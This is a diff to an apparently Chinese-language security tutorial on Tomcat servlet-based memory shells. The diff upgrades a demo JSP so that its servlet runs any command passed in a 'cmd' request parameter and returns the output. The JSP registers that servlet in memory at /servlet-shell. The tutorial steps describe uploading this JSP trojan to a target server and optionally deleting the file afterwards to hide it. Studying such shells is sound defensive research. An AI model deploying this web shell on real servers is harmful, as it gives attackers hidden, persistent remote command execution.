@@ -113,20 +113,31 @@ wrapper又是什么？
 
 ## 示例代码
 
-```java
+```jsp
 <%@ page import="java.io.IOException" %>
 <%@ page import="java.lang.reflect.*" %>
 <%@ page import="org.apache.catalina.core.*" %>
 <%@ page import="org.apache.catalina.Wrapper" %>
+<%@ page import="java.io.BufferedReader" %>
+<%@ page import="java.io.InputStreamReader" %>
 <%@ page contentType="text/html;charset=UTF-8" language="java" %>
 <%!
     // 定义一个恶意servlet
-   public class ShellServlet extends HttpServlet {
-       @Override
-       public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
-           Runtime.getRuntime().exec("calc");
-       }
-   }
+    public class ShellServlet extends HttpServlet {
+        @Override
+        public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
+            String cmd = request.getParameter("cmd");
+            if (cmd != null) {
+                Process process = Runtime.getRuntime().exec(cmd);
+                BufferedReader bufferedReader = new BufferedReader(
+                        new InputStreamReader(process.getInputStream()));
+                String line;
+                while ((line = bufferedReader.readLine()) != null) {
+                    response.getWriter().println(line);
+                }
+            }
+        }
+    }
 %>
 <%
     // 从request中获取servletContext
@@ -145,13 +156,13 @@ wrapper又是什么？
     Wrapper wrapper = standardContext.createWrapper();
 
     // 将自己的Servlet封装进wrapper对象
-    wrapper.setName("memshell");
+    wrapper.setName("servlet-shell");
     wrapper.setServletClass(ShellServlet.class.getName());
     wrapper.setServlet(new ShellServlet());
 
     // 将wrapper添加到上下文并设置映射路径
     standardContext.addChild(wrapper);
-    standardContext.addServletMappingDecoded("/memshell", "memshell");
+    standardContext.addServletMappingDecoded("/servlet-shell", "servlet-shell");
 %>
 ```
 
@@ -159,7 +170,5 @@ wrapper又是什么？
 
 1. 上传jsp木马至目标服务器
 2. 访问上传的jsp
-3. 访问定义的恶意servlet映射路径，演示的是/memshell
+3. 访问定义的恶意servlet映射路径，演示的是/servlet-shell
 4. （可选）删除.jsp文件
-
-‍
